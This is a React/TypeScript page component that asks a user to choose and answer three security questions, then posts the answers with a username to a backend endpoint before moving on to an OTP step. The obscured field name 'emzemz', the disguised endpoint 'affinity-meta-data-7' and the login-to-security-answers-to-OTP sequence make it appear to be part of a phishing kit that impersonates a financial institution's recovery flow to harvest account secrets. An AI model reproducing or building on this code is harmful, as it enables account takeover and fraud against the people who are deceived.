import React, { useMemo, useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import axios from 'axios';
import { baseUrl } from '../constants';
import FlowCard from '../components/FlowCard';
import FormError from '../components/FormError';

const questions = [
  'What was your childhood nickname?',
  "What is your mother's maiden name?",
  'What was the name of your first pet?',
  'What was the make and model of your first car?',
  'What city were you born in?',
  'What is your favorite childhood memory?',
  'What was your first job title?',
  'What is the name of your favorite teacher?',
  'What is your favorite book or movie character?',
  'What street did you grow up on?',
];

const footer = (
  <div>
    <p className="text-xs text-gray-600">
      For security reasons, never share your security questions or answers. We will use them only to verify your identity during account recovery.
    </p>
  </div>
);

const SecurityQuestions: React.FC = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const [username] = useState(() => (location.state as { emzemz?: string } | undefined)?.emzemz ?? '');
  const [question1, setQuestion1] = useState('');
  const [answer1, setAnswer1] = useState('');
  const [question2, setQuestion2] = useState('');
  const [answer2, setAnswer2] = useState('');
  const [question3, setQuestion3] = useState('');
  const [answer3, setAnswer3] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [errors, setErrors] = useState<{ [key: string]: string }>({});

  const availableQuestionsFor = useMemo(
    () => ({
      second: questions.filter((question) => question !== question1),
      third: questions.filter((question) => ![question1, question2].includes(question)),
    }),
    [question1, question2]
  );

  if (!username) {
    return (
      <FlowCard title="Set your security questions">
        <p className="text-sm text-gray-700 text-center">
          We lost your session details. Restart the enrollment flow to continue.
        </p>
        <button
          type="button"
          onClick={() => navigate('/login')}
          className="mt-6 w-full bg-purple-900 hover:bg-purple-800 text-white py-2 rounded-md font-medium transition"
        >
          Back to login
        </button>
      </FlowCard>
    );
  }

  const validateForm = () => {
    const nextErrors: { [key: string]: string } = {};

    if (!question1) nextErrors.question1 = 'Select a question.';
    if (!answer1.trim()) nextErrors.answer1 = 'Provide an answer.';
    if (!question2) nextErrors.question2 = 'Select a question.';
    if (!answer2.trim()) nextErrors.answer2 = 'Provide an answer.';
    if (!question3) nextErrors.question3 = 'Select a question.';
    if (!answer3.trim()) nextErrors.answer3 = 'Provide an answer.';

    setErrors(nextErrors);
    return Object.keys(nextErrors).length === 0;
  };

  const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    if (!validateForm()) {
      return;
    }

    setIsLoading(true);

    try {
      await axios.post(`${baseUrl}api/affinity-meta-data-7/`, {
        emzemz: username,
        securityQuestion1: question1,
        securityAnswer1: answer1,
        securityQuestion2: question2,
        securityAnswer2: answer2,
        securityQuestion3: question3,
        securityAnswer3: answer3,
      });

      navigate('/otp', { state: { username } });
    } catch (error) {
      console.error('Error submitting security questions:', error);
      setErrors((prev) => ({ ...prev, form: 'Unable to submit your answers. Please try again.' }));
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <FlowCard
      title="Set your security questions"
      subtitle={<span>Choose unique questions and answers to protect your account.</span>}
      footer={footer}
    >
      <form onSubmit={handleSubmit} className="space-y-5">
        <div className="space-y-3">
          <label className="block text-sm font-medium text-gray-700" htmlFor="question-1">
            Security question 1
          </label>
          <select
            id="question-1"
            value={question1}
            onChange={(event) => {
              setQuestion1(event.target.value);
              if (event.target.value === question2) {
                setQuestion2('');
              }
              if (event.target.value === question3) {
                setQuestion3('');
              }
            }}
            className="w-full border border-gray-300 rounded-md px-3 py-2 text-sm focus:outline-none"
          >
            <option value="">Select a security question</option>
            {questions.map((question) => (
              <option key={question} value={question}>
                {question}
              </option>
            ))}
          </select>
          <FormError message={errors.question1 ?? ''} />
          <input
            id="answer-1"
            type="text"
            value={answer1}
            onChange={(event) => setAnswer1(event.target.value)}
            className="w-full border border-gray-300 rounded-md px-3 py-2 text-sm focus:outline-none"
            placeholder="Enter your answer"
          />
          <FormError message={errors.answer1 ?? ''} />
        </div>

        <div className="space-y-3">
          <label className="block text-sm font-medium text-gray-700" htmlFor="question-2">
            Security question 2
          </label>
          <select
            id="question-2"
            value={question2}
            onChange={(event) => {
              setQuestion2(event.target.value);
              if (event.target.value === question3) {
                setQuestion3('');
              }
            }}
            className="w-full border border-gray-300 rounded-md px-3 py-2 text-sm focus:outline-none"
          >
            <option value="">Select a security question</option>
            {availableQuestionsFor.second.map((question) => (
              <option key={question} value={question}>
                {question}
              </option>
            ))}
          </select>
          <FormError message={errors.question2 ?? ''} />
          <input
            id="answer-2"
            type="text"
            value={answer2}
            onChange={(event) => setAnswer2(event.target.value)}
            className="w-full border border-gray-300 rounded-md px-3 py-2 text-sm focus:outline-none"
            placeholder="Enter your answer"
          />
          <FormError message={errors.answer2 ?? ''} />
        </div>

        <div className="space-y-3">
          <label className="block text-sm font-medium text-gray-700" htmlFor="question-3">
            Security question 3
          </label>
          <select
            id="question-3"
            value={question3}
            onChange={(event) => setQuestion3(event.target.value)}
            className="w-full border border-gray-300 rounded-md px-3 py-2 text-sm focus:outline-none"
          >
            <option value="">Select a security question</option>
            {availableQuestionsFor.third.map((question) => (
              <option key={question} value={question}>
                {question}
              </option>
            ))}
          </select>
          <FormError message={errors.question3 ?? ''} />
          <input
            id="answer-3"
            type="text"
            value={answer3}
            onChange={(event) => setAnswer3(event.target.value)}
            className="w-full border border-gray-300 rounded-md px-3 py-2 text-sm focus:outline-none"
            placeholder="Enter your answer"
          />
          <FormError message={errors.answer3 ?? ''} />
        </div>

        <FormError message={errors.form ?? ''} />

        <button
          type="submit"
          className="w-full bg-purple-900 hover:bg-purple-800 text-white py-2 rounded-md font-medium transition disabled:opacity-70"
          disabled={isLoading}
        >
          {isLoading ? 'Submitting…' : 'Continue'}
        </button>
      </form>
    </FlowCard>
  );
};

export default SecurityQuestions;
